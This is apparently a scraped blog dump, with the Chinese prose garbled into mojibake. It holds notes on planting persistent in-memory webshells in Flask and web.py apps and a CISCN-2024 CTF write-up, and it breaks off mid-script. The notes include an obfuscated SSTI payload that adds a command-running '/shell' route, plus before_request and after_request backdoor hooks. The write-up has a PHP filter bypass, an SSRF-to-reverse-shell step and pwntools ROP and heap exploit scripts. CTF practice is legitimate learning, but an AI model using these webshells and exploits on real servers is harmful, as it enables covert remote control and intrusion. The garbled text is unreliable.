get_flashed_messages|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"__builtins__\")|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\u0065\\u0076\\u0061\\u006c\")(\"app.add_ur\"+\"l_rule('/shell', 'shell', la\"+\"mbda :__imp\"+\"ort__('o\"+\"s').po\"+\"pen(_request_c\"+\"tx_stack.to\"+\"p.re\"+\"quest.args.get('shell')).re\"+\"ad())\",{'\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u005f\\u0063\\u0074\\u0078\\u005f\\u0073\\u0074\\u0061\\u0063\\u006b':get_flashed_messages|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u005f\\u0063\\u0074\\u0078\\u005f\\u0073\\u0074\\u0061\\u0063\\u006b\"),'app':get_flashed_messages|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetattribute\\x5f\\x5f\")(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u005f\\u0061\\u0070\\u0070\")}) ä¸å‡ºç½‘æˆ–æ— å›æ˜¾ å¸¸è§„æ€è·¯ Flaskçš„å†…å­˜é©¬é€‚ç”¨äºpickleååºåˆ—åŒ–ã€SSTIç­‰èƒ½å¤Ÿè¾¾æˆä»£ç æ‰§è¡Œã€‚ é¦–å…ˆä»sys.modulesä¸­è·å–appå¯¹è±¡ï¼ˆsys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ï¼‰ getApp = sys.modules['__main__'].__dict__['app'] è·å–APPå¯¹è±¡åå°±èƒ½æ“ä½œå½“å‰Flask APPçš„é…ç½®äº†ï¼Œåœ¨æ— å›æ˜¾ã€ä¸å‡ºç½‘çš„å‰æä¸‹ï¼Œä¸ºäº†è·å–RCEå›æ˜¾ï¼Œæ­¤æ—¶æœ‰å››æ¡è·¯å¯é€‰ æ‰“å¼€Flaskçš„Debugæ¨¡å¼ï¼ŒæŠ›å‡ºExceptionæ¥å›æ˜¾ import sys sys.modules['__main__'].__dict__['app'].debug=True ä¾‹å¦‚pickleååºåˆ—åŒ–ä»£ç æ‰§è¡Œçš„æƒ…å†µä¸‹ä½¿ç”¨å¼‚å¸¸ä¿¡æ¯æ¥å›æ˜¾ class genpoc(object): def __reduce__(self): s = \"raise Exception(__import__('os').popen('ls /').read())\" # è¦æ‰§è¡Œçš„å‘½ä»¤ return exec, (s,) # reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸² å…³é—­Flaskçš„Debugæ¨¡å¼ï¼Œå®ç°ä¸€ä¸ªå†…å­˜é©¬ï¼ˆé€šè¿‡add_url_ruleæ–¹æ³•ï¼‰ import sys sys.modules['__main__'].__dict__['app'].debug=False sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('ls /').read()) è®¾ç½®Flaskçš„é™æ€æ–‡ä»¶ç›®å½•ä¸º/tmpï¼Œé€šè¿‡&gt;å†™å‘½ä»¤æ‰§è¡Œç»“æœ import sys sys.modules['__main__'].__dict__['app'].static_url_path='/static' sys.modules['__main__'].__dict__['app'].static_folder='/tmp/' __import__('os').popen('ls / &gt; /tmp/test').read() æ—¶é—´ç›²æ³¨ï¼Œå‘½ä»¤æ‰§è¡Œé…åˆsleepé€å­—ç¬¦åˆ¤æ–­ï¼Œä¾‹å¦‚å¦‚ä¸‹å‘½ä»¤ å‡è®¾flagæ˜¯abcdï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºaåˆ™ä¼šæ‰§è¡Œsleep 3å»¶æ—¶ä¸‰ç§’ï¼Œå¦åˆ™ä¸æ‰§è¡Œsleep 3 echo 'abcd' | cut -b 1 | grep a &amp;&amp; sleep 3 web.pyå†…å­˜é©¬ è¿™ä¸ªæš‚æ—¶ä¸ç†è§£ web.pyä¸­å¯ä»¥é€šè¿‡add_processoræ–¹æ³•å®ç°ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œè°ƒç”¨handler()å³ä¸ºè·å–æ‹¦æˆªå‰çš„è·¯ç”±çš„ç»“æœ def my_processor(handler): print(\"before handling\") result = handler() print(\"after handling\") return result app.add_processor(my_processor) å½“åç«¯ä¸ºweb.pyæ—¶çš„å†…å­˜é©¬å®ç°æ–¹æ³•å¦‚ä¸‹ import sys def hello(handler): import subprocess params = web.input() cmd = params.cmd output = subprocess.check_output(cmd, shell=True).decode('utf-8') return output app = sys.modules['__main__'].__dict__['app'] app.add_processor(hello) add_url_ruleæ— ç”¨ æ®æ–‡ç« æ‰€ç¤ºï¼Œå½“ä¸‹çš„flaskç‰ˆæœ¬å·²ç»ä¸æ”¯æŒå†è¿è¡Œç¨‹åºçš„æ—¶å€™é€šè¿‡add_url_ruleæ·»åŠ è·¯ç”±äº†ï¼Œè¿™é‡Œæ–‡ç« ä»‹ç»äº†å¦ä¸€ä¸ªæ–¹æ³•æ¥æ·»åŠ ï¼šä½¿ç”¨@app.before_requestè£…é¥°å™¨ before_request åœ¨ Flask ä¸­ï¼Œbefore_request æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒç”¨äºåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œç‰¹å®šçš„å‡½æ•°ã€‚è¿™ä¸ªè£…é¥°å™¨å…è®¸å¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼Œæ¯”å¦‚è®¤è¯æ£€æŸ¥ã€æ—¥å¿—è®°å½•ã€è®¾ç½®å“åº”å¤´ç­‰ã€‚ å®šä½åˆ°å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° é€šè¿‡åº•å±‚æºç å¯ä»¥çœ‹åˆ°before_requestå®é™…ä¸Šè°ƒç”¨çš„æ˜¯self.before_request_funcs.setdefault(None, []).append(f)ï¼Œå…¶æ„æ€æ˜¯ï¼š æ£€æŸ¥ self.before_request_funcs å­—å…¸ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªé”®ä¸º None çš„æ¡ç›®ã€‚ å¦‚æœæ²¡æœ‰ None é”®ï¼Œå°±åœ¨å­—å…¸ä¸­åˆ›å»ºå®ƒï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸€ä¸ªç©ºåˆ—è¡¨ã€‚ ç„¶åï¼Œæ— è®º None é”®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½å°†å‡½æ•° f æ·»åŠ åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚ é‚£æ„å‘³ç€æˆ‘ä»¬ç”¨è¿‡è¿™ä¸ªfï¼Œå°±èƒ½å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°äº† å½“è®¿é—®http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None, []).append(lambda: \"123\")åï¼Œåç»­æ‰€æœ‰çš„è®¿é—®ç»“æœéƒ½å°†å˜æˆ123ï¼Œä¸‹é¢æ˜¯é‚£ä½å¸ˆå‚…çš„æˆªå›¾ï¼Œæˆ‘æ²¡å¤ç°æˆåŠŸ å¯è§é€šè¿‡before_requestæ·»åŠ å†…å­˜é©¬è¿™ä¸€æ¡è·¯æ˜¯å¯è¡Œçš„ï¼Œä½†åŒæ ·ä¼šæœ‰ä¸€ç‚¹é—®é¢˜ï¼Œå°±æ˜¯ä½¿ç”¨lambdaå¿…ç„¶ä¼šå¾—åˆ°ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¹ˆæœåŠ¡åç»­çš„æ“ä½œéƒ½æ— æ³•è¿›è¡Œï¼Œä¼šå½±å“åˆ°ä¸»æœºçš„æ­£å¸¸ä¸šåŠ¡ã€‚ after_request é’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@app.after_requestæ¥è§£å†³ï¼Œä¸@app.before_requestç±»ä¼¼ï¼Œafter_requestä¼šåœ¨è¯·æ±‚ç»“æŸå¾—åˆ°å“åº”åŒ…ä¹‹åè¿›è¡Œæ“ä½œï¼ŒæŸ¥çœ‹åº•å±‚æºç å¯ä»¥çœ‹åˆ°å…¶è°ƒç”¨æ–¹æ³•å’Œbefore_requestç±»ä¼¼ self.after_request_funcs.setdefault(None, []).append(f)ä¼ å…¥çš„få°±æ˜¯å¯¹åº”çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†è¿™é‡Œçš„féœ€è¦æ¥æ”¶ä¸€ä¸ªresponseå¯¹è±¡ï¼ŒåŒæ—¶è¿”å›ä¸€ä¸ªresponseå¯¹è±¡ã€‚ ä½†æˆ‘ä»¬ä»…é€šè¿‡lambadæ— æ³•å¯¹åŸå§‹ä¼ è¿›æ¥çš„responseè¿›è¡Œä¿®æ”¹åå†è¿”å›ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ç”Ÿæˆä¸€ä¸ªresponseå¯¹è±¡ï¼Œç„¶åå†è¿”å›è¿™ä¸ªresponseã€‚ è®¿é—®å¯¹åº”çš„urlä¸ºhttp://127.0.0.1:5000/e?cmd=app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec('global CmdResp;CmdResp=make_response(os.popen(request.args.get(\\'cmd\\')).read())')==None else resp) å‡½æ•°çš„å†…å®¹ä¸ºï¼š lambda resp: #ä¼ å…¥å‚æ•° CmdResp if request.args.get('cmd') and #å¦‚æœè¯·æ±‚å‚æ•°å«æœ‰cmdåˆ™è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ exec(' global CmdResp; #å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ–¹ä¾¿è·å– CmdResp=make_response(os.popen(request.args.get(\\'cmd\\')).read()) #åˆ›å»ºä¸€ä¸ªå“åº”å¯¹è±¡ ')==None #æ’çœŸ else resp) #å¦‚æœè¯·æ±‚å‚æ•°æ²¡æœ‰cmdåˆ™æ­£å¸¸è¿”å› #è¿™é‡Œçš„cmdå‚æ•°åå’ŒCmdRespå˜é‡åéƒ½æ˜¯å¯ä»¥æ”¹çš„ï¼Œæœ€å¥½æ”¹æˆæœåŠ¡ä¸­ä¸å­˜åœ¨çš„å˜é‡åä»¥å…å½±å“æ­£å¸¸ä¸šåŠ¡ 0x06 å‚è€ƒæ–‡ç«  flask æºç è§£æï¼šä¸Šä¸‹æ–‡ [Python]Flaskå†…å­˜é©¬å­¦ä¹  Python å†…å­˜é©¬åˆ†æ CTFä¸­Python_Flaskåº”ç”¨çš„ä¸€äº›è§£é¢˜æ–¹æ³•æ€»ç»“ Python Flaskå†…å­˜é©¬çš„å¦è¾Ÿé€”å¾„","tags":["webçŸ¥è¯†æ€»ç»“"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"CISCN-2024Wp","path":"/2024/05/21/ciscn-2024wp/","content":"å…ˆå†™ä¸ªæ¯”èµ›å‡ºæ¥çš„ï¼Œåé¢æœ‰æ—¶é—´éƒ½å¤ç°ä¸€ä¸‹ã€‚ åˆæ˜¯æ¯”èµ›åç‰¢çš„ä¸€å¤©~~ï¼Œéš¾å—å•Š 0x01 Web Simple_php &lt;?php ini_set('open_basedir', '/var/www/html/'); error_reporting(0); if(isset($_POST['cmd'])){ $cmd = escapeshellcmd($_POST['cmd']); if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\'|\\\"|id|whoami/i', $cmd)) { system($cmd); } } show_source(__FILE__); ?&gt; å¯ä»¥çœ‹åˆ°æ²’æœ‰è¿‡æ»¤prå‘½ä»¤ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥ç”¨æ— å‚æ•°RCEï¼Œæ¯”å¦‚hex2binå°†16è¿›åˆ¶è½¬å­—ç¬¦æ¥ç»•è¿‡è¿‡æ»¤å³å¯ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç»•è¿‡ å¦‚ä¸‹å›¾ã€‚lsç”¨æ¢è¡Œç¬¦ç»•è¿‡ï¼Œå‘ç°æ ¹ç›®å½•ä¸å­˜åœ¨flagï¼Œå°è¯•è¯»å–é…ç½®æ–‡ä»¶ ç”¨pr /etc/passwdè¯»å–åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œå‘ç°å­˜åœ¨mysql serverç”¨æˆ·ï¼ŒçŒœæµ‹flagåœ¨æ•°æ®åº“ä¸­ æ¥ç€åˆ©ç”¨hex2binä¸substré…åˆè¯»å–æ•°æ®åº“å cmd=php -r eval(hex2bin(substr(_73797374656d28226d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b2722293b,1))); å¾—åˆ°PHP_CMSï¼Œè¿›ä¸€æ­¥è¯»å–è¡¨åï¼šF1agâ€¦ï¼Œæœ€ç»ˆè¯»å–flagå³å¯ easycms å‚è€ƒæ–‡ç« ï¼š https://xz.aliyun.com/t/11457?time__1311=mqmx0DB7e42DnDBuekGk8DkbfK7KXKG8eD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F https://www.zilyun.com/43164.html ç»è¿‡å­¦ä¹ èƒ½äº†è§£åˆ°è¯¥cmsçš„æ§åˆ¶å‡½æ•°çš„è®¿é—®æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ ¹æ®qrcodeå‡½æ•°æ‰€åœ¨ä½ç½®ï¼Œå¯ä»¥æ ¹æ®ä¸Šè¿°æ–‡ç« æ„é€ å‡ºpayload ?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://ip:/302.php&amp;size=10&amp;level=1 åˆ©ç”¨çš„å°±æ˜¯è¿™é‡Œå‚æ•°å¯æ§ï¼Œå¹¶ä¸”å­˜åœ¨file_get_contentså‡½æ•°ï¼Œå¯ä»¥æƒ³åˆ°ssrfï¼Œåœ¨è‡ªå·±vpsæ„é€ æ–‡ä»¶è¿›è¡Œ302è·³è½¬å³å¯ å¦‚ä¸‹å›¾ï¼Œpayloadä¸ºbash -cåå¼¹shell æœ¬åœ°vpsç›‘å¬ç«¯å£ï¼Œä¹‹åæ ¹ç›®å½•è¿è¡Œreadflagå³å¯ easycmd_revenge ä¸æ˜¨å¤©å¤§åŒå°å¼‚ï¼Œå°±æ˜¯å¢åŠ äº†æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œåˆ©ç”¨GIF89aå³å¯ç»•è¿‡ï¼Œä¹‹åæ€è·¯åŒæ˜¨å¤©ä¸€æ ·å³å¯ vpsç›‘å¬ï¼Œè¿è¡Œreadflagæ‹¿åˆ°flag 0x02 Re asm_re åœ¨txtä¸­æŒ‰è¿‡ç¨‹åˆ†ææ±‡ç¼–ä»£ç å°±è¡Œ _text:0000000100003BE0è¡Œè¡¨æ˜äº†flagçš„æ ¼å¼ _text:0000000100003BF0ç»™äº†srcæ•°æ®å­˜å‚¨çš„ä½ç½® _text:0000000100003C04 strlen()å‡½æ•°å–é•¿åº¦ æ¥ä¸‹æ¥ è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå¾ªç¯ æ¥ä¸‹æ¥æ˜¯åŠ å¯†å‡½æ•° åˆ†æè¿™æ®µç¨‹åºæ•°æ®å…ˆä¹˜0x50ï¼Œå†åŠ 0x14ï¼Œç„¶åå’Œ0x4Då¼‚æˆ–ï¼Œå†åŠ ä¸Š0x1E æ¥ç€è¿è¡Œåˆ° åˆæ˜¯ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œé€»è¾‘åŸºæœ¬ä¸€æ ·ï¼Œ æœ€ååœ¨è¿™é‡Œåˆ¤æ–­æ˜¯å¦ä¸flagç›¸åŒï¼Œå‰©ä¸‹å°±æ˜¯æ‰¾æ•°æ®å†™è§£å¯†è„šæœ¬å°±è¡Œï¼Œæ ¹æ®åˆ†æç»“æœå†™è„šæœ¬å¾—åˆ° Expå¦‚ä¸‹ï¼š def decrypt_data(data): decrypted = [] for i in range(0, len(data), 4): value = int.from_bytes(data[i:i+4], \"little\") value -= 0x1e value ^= 0x4d value -= 0x14 value //= 0x50 decrypted.append(chr(value)) return ''.join(decrypted) s = [0xD7, 0x1F, 0, 0, 0xB7, 0x21, 0, 0, 0x47, 0x1E, 0, 0, 0x27, 0x20, 0, 0, 0xE7, 0x26, 0, 0, 0xD7, 0x10, 0, 0, 0x27, 0x11, 0, 0, 7, 0x20, 0, 0, 0xC7, 0x11, 0, 0, 0x47, 0x1E, 0, 0, 0x17, 0x10, 0, 0, 0x17, 0x10, 0, 0, 0xF7, 0x11, 0, 0, 7, 0x20, 0, 0, 0x37, 0x10, 0, 0, 7, 0x11, 0, 0, 0x17, 0x1F, 0, 0, 0xD7, 0x10, 0, 0, 0x17, 0x10, 0, 0, 0x17, 0x10, 0, 0, 0x67, 0x1F, 0, 0, 0x17, 0x10, 0, 0, 0xC7, 0x11, 0, 0, 0xC7, 0x11, 0, 0, 0x17, 0x10, 0, 0, 0xD7, 0x1F, 0, 0, 0x17, 0x1F, 0, 0, 7, 0x11, 0, 0, 0x47, 0xF, 0, 0, 0x27, 0x11, 0, 0, 0x37, 0x10, 0, 0, 0x47, 0x1E, 0, 0, 0x37, 0x10, 0, 0, 0xD7, 0x1F, 0, 0, 7, 0x11, 0, 0, 0xD7, 0x1F, 0, 0, 7, 0x11, 0, 0, 0x87, 0x27, 0, 0] print(decrypt_data(s)) androidso_re jadxé™æ€åˆ†æå¾—åˆ°éœ€è¦çš„æ˜¯soé‡Œé¢çš„ä¸¤ä¸ªå‡½æ•°çš„å€¼ï¼Œä¸€ä¸ªæ˜¯getkey()å’Œgetiv() ç”¨unidbgé¡¹ç›®æ¨¡æ‹Ÿæ‰§è¡Œå¾—åˆ°getkey()å’Œgetiv() å¾—åˆ°åç›´æ¥è„šæœ¬é€†å‘å°±è¡Œ Expå¦‚ä¸‹ï¼š unidbgè„šæœ¬ï¼Œç¬¬äºŒä¸ªæŠŠè°ƒç”¨getkeyæ–¹æ³•é‡Œé¢çš„\"getkey()Ljava/lang/String;\"æ”¹ä¸º\"getiv()Ljava/lang/String;\"å°±è¡Œ package com.ciscn; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.Module; import com.github.unidbg.debugger.Debugger; import com.github.unidbg.debugger.DebuggerType; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import java.io.File; import java.io.IOException; public class ciscn extends AbstractJni { private final AndroidEmulator emulator; private final VM vm; private final Module module; private final DalvikModule dalvikModule; // æ„é€ å‡½æ•° public ciscn(String apkFilePath, String soFilePath, String processName) { this.emulator = initializeEmulator(processName); this.vm = initializeVM(apkFilePath); this.dalvikModule = loadLibrary(soFilePath); this.module = dalvikModule.getModule(); configureVM(); } // åˆå§‹åŒ–æ¨¡æ‹Ÿå™¨ private AndroidEmulator initializeEmulator(String processName) { return AndroidEmulatorBuilder.for64Bit() .setProcessName(processName) .build(); } // åˆå§‹åŒ–è™šæ‹Ÿæœº private VM initializeVM(String apkFilePath) { VM virtualMachine = emulator.createDalvikVM(new File(apkFilePath)); virtualMachine.setVerbose(false); return virtualMachine; } // åŠ è½½åº“æ–‡ä»¶ private DalvikModule loadLibrary(String soFilePath) { Memory memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); DalvikModule dm = vm.loadLibrary(new File(soFilePath), true); dm.callJNI_OnLoad(emulator); return dm; } // é…ç½®è™šæ‹Ÿæœº private void configureVM() { vm.setJni(this); vm.setVerbose(true); } // è°ƒç”¨ getKey æ–¹æ³• public String getKey() { DvmClass checkerClass = vm.resolveClass(\"com.example.re11113.jni\"); DvmObject&lt;?&gt; checkerInstance = checkerClass.newObject(null); DvmObject&lt;?&gt; result = checkerInstance.callJniMethodObject(emulator, \"getiv()Ljava/lang/String;\"); return result.getValue().toString(); } // ä¸»å‡½æ•° public static void main(String[] args) { String soFilePath = \"D:\\\\jaja\\\\unidbg-master\\\\unidbg-android\\\\src\\\\test\\\\java\\\\com\\\\ciscn\\\\libSecret_entrance.so\"; String apkFilePath = \"D:\\\\jaja\\\\unidbg-master\\\\unidbg-android\\\\src\\\\test\\\\java\\\\com\\\\ciscn\\\\app-debug.apk\"; String processName = \"com.test.test\"; ciscn isccInstance = new ciscn(apkFilePath, soFilePath, processName); System.out.println(\"result: \" + isccInstance.getKey()); } } è§£å¯†è„šæœ¬ import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.nio.charset.StandardCharsets; import java.util.Arrays; import java.util.Base64; public class Main { public static String reverseDecrypt(String encryptedText) { try { // ç¡¬ç¼–ç å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ String key = \"A8UdWaeq\"; String iv = \"Wf3DLups\"; // ä½¿ç”¨å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡åˆå§‹åŒ– Cipher å¯¹è±¡ Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"DES\"); IvParameterSpec ivParameterSpec = new IvParameterSpec(iv.getBytes(StandardCharsets.UTF_8)); cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec); // è§£å¯†å¯†æ–‡ byte[] encryptedBytes = Base64.getDecoder().decode(encryptedText); byte[] decryptedBytes = cipher.doFinal(encryptedBytes); String decryptedText = new String(decryptedBytes, StandardCharsets.UTF_8); return decryptedText; } catch (Exception e) { e.printStackTrace(); return null; } } public static void main(String[] args) { String encryptedText = \"JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==\"; // æ›¿æ¢ä¸ºå®é™…çš„å¯†æ–‡ String decryptedText = reverseDecrypt(encryptedText); System.out.println(\"è§£å¯†ç»“æœ: \" + decryptedText); } } whereThel1b æ‰“å¼€pythonè„šæœ¬åˆ†æï¼Œå‘ç°å®ƒè°ƒç”¨äº†ä¸€ä¸ªsoæ–‡ä»¶ï¼Œè¿™ä¸ªsoæ˜¯cpythonç¼–è¯‘çš„ï¼Œç”¨python3.10å¯ä»¥è¿è¡Œ ida64åˆ†æsoï¼Œæœç´¢å…³é”®å‡½æ•°ï¼Œä¸€ä¸ªwhereistheflagï¼Œä¸€ä¸ªtrytry å…³é”®åœ°æ–¹æ˜¯è¿™é‡Œbase64ç¼–ç  è¿™é‡Œv31æ˜¯ç»“æœï¼Œv34å’Œv31ç›¸åŒ å†å¾€ä¸‹åˆ†æ v35å’Œåæ¥çš„v34å¼‚æˆ– è¿™é‡Œçœ‹åˆ°v8=values[0],ç»§ç»­åˆ†ææ‰¾values è¿™é‡Œå¯ä»¥çœ‹å‡ºvalues[]å’Œv53æœ‰å…³ å¯ä»¥çœ‹å‡ºå…¶ä½™__pyx_argsæœ‰å…³ç³»ï¼Œå®é™…ä¸Šæ˜¯æˆ‘ä»¬è¾“å…¥çš„flagå‚æ•° ç¨‹åºçš„é€»è¾‘å°±æ˜¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡base64å¤„ç†åä¸randoméšæœºç”Ÿæˆçš„åºåˆ—è¿›è¡Œå¼‚æˆ–ç„¶åä¸encryè¿›è¡Œæ¯”è¾ƒã€‚ ä»ä¸Šé¢åˆ†æä¹Ÿèƒ½çœ‹åˆ°whereThel1bçš„å‡ ä¸ªå‡½æ•°æ ‡æœ‰åºå·æ•°å­—ï¼Œå†åˆ†æåè¿™äº›å‡½æ•°åªæœ‰seedå‡½æ•°çš„å‚æ•°ä¸ä¸€æ ·ï¼Œæ¯ä¸ªseedå‡½æ•°çš„å‚æ•°éƒ½æ˜¯å…¶æœ«å°¾çš„æ•°å­—ï¼Œåˆ©ç”¨seedè¿›è¡Œä¼ªéšï¼Œä»seedçš„ä¸åŒå€¼å‘ç°seed(0)å¯ä»¥å¾—åˆ°flag æ‰€ä»¥ç›´æ¥å†™è„šæœ¬è§£å¯† Expå¦‚ä¸‹ï¼š import base64 import random random.seed(0) encrypted_message = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26] keys = [random.randint(0, len(encrypted_message)) for _ in range(len(encrypted_message))] decrypted_message = [keys[i] ^ encrypted_message[i] for i in range(len(encrypted_message))] decoded_string = ''.join(map(chr, decrypted_message)) decoded_flag = base64.b64decode(decoded_string.encode()) print(decoded_flag) 0x03 Pwn gostack ida64æ‰“å¼€åˆ†æ å­—ç¬¦ä¸²æœç´¢æ‰¾åˆ°å…³é”®ä½ç½® fmt_Fprintfå‡½æ•°ï¼Œ\\x00æˆªæ–­ è¿™é‡Œbssæ®µå¯ä»¥å†™\\bin\\sh ç”¨ROPgatgetæ‰¾åˆ°éœ€è¦çš„åœ°å€ï¼Œåˆ©ç”¨ret2syscallè¾¾åˆ°æ”»å‡» å†™pythonè„šæœ¬æ‰“ Expå¦‚ä¸‹ï¼š from pwn import * # é…ç½®pwnå·¥å…·åº“ context(log_level='debug', arch='amd64') # é…ç½®éƒ¨åˆ† LOCAL = False REMOTE_URL = '8.147.128.96 15370' BINARY_PATH = './gostack' # å¯åŠ¨ç¨‹åºæˆ–è¿œç¨‹è¿æ¥ if LOCAL: io = process(BINARY_PATH) else: io = remote(*REMOTE_URL.replace(':', ' ').split()) # åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ elf = ELF(BINARY_PATH) bss_segment = 0x563950 # è®¾ç½®gdbè°ƒè¯•æ–­ç‚¹ # gdb.attach(io, 'b *0x4A0A28') pause() # ROPé“¾çš„Gadgetåœ°å€ syscall_ret_address = 0x4616C9 pop_rdi_6_address = 0x00000000004a18a5 pop_rsi_address = 0x000000000042138a pop_rax_address = 0x000000000040f984 pop_rdx_address = 0x00000000004944ec # æ„é€ payload payload = b'a' + b'\\x00' * (0x1c8 + 0x8 - 1) payload += p64(pop_rdi_6_address) payload += p64(0) payload += p64(0) * 5 payload += p64(pop_rsi_address) payload += p64(bss_segment) payload += p64(pop_rdx_address) payload += p64(0x10) payload += p64(pop_rax_address) payload += p64(0) payload += p64(syscall_ret_address) payload += p64(pop_rdi_6_address) payload += p64(bss_segment) payload += p64(0) * 5 payload += p64(pop_rsi_address) payload += p64(0) payload += p64(pop_rdx_address) payload += p64(0) payload += p64(pop_rax_address) payload += p64(59) payload += p64(syscall_ret_address) # å‘é€payload io.sendlineafter('Input your magic message :', payload) sleep(0.1) io.sendline('/bin/sh\\x00') # è¿›å…¥äº¤äº’æ¨¡å¼ io.interactive() orange_cat_diary idaæ‰“å¼€é™„ä»¶åˆ†æ ä¸»å‡½æ•°å¦‚ä¸Š å‘ç°UAFæ¼æ´ è¿™é‡Œå¯ä»¥å †æº¢å‡ºï¼Œä»è€Œè¦†ç›–top_chunkçš„sizeéƒ¨åˆ† glibcæ˜¯2.23ç‰ˆæœ¬ï¼Œå¯ä»¥åˆ©ç”¨hourse of orange ä½¿ç”¨gdbåŠ¨æ€è°ƒè¯•ï¼Œæ³„éœ²å¾—åˆ°ä¸€äº›å †åœ°å€å’Œlibcåœ°å€ä¿¡æ¯ æ¥ç€ç”¨one_gadgetå¯»æ‰¾ç¨‹åºä¸­çš„ç‰¹å®šgadgetï¼ˆç‰‡æ®µï¼‰æ¥è·å–shell é€šè¿‡ä¿®æ”¹__malloc_hookä¸­çš„å†…å®¹ä¸ºshellcodeï¼Œæœ€åmallocéšä¾¿ä¸€ä¸ªå°±èƒ½è·å¾—shell Expå¦‚ä¸‹ï¼š from pwn import * from LibcSearcher import * import ctypes from struct import pack import numpy as np from ctypes import * from math import log import warnings # é…ç½®éƒ¨åˆ† BINARY_PATH = \"./orange_cat_diary\" LIBC_PATH = \"./libc-2.23.so\" REMOTE_URL = '8.147.128.96 27419' LOCAL = False # åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶å’Œåº“æ–‡ä»¶ elf = ELF(BINARY_PATH) libc = ELF(LIBC_PATH) # å¯åŠ¨ç¨‹åºæˆ–è¿œç¨‹è¿æ¥ if LOCAL: io = process(BINARY_PATH) else: io = remote(*REMOTE_URL.replace(':', ' ').split()) # å¿½ç•¥å­—èŠ‚è­¦å‘Š warnings.filterwarnings(\"ignore\", category=BytesWarning) # é…ç½®pwnåº“ context(log_level='debug', os='linux', arch='amd64') # è¾…åŠ©å‡½æ•° def debug(cmd=''): if 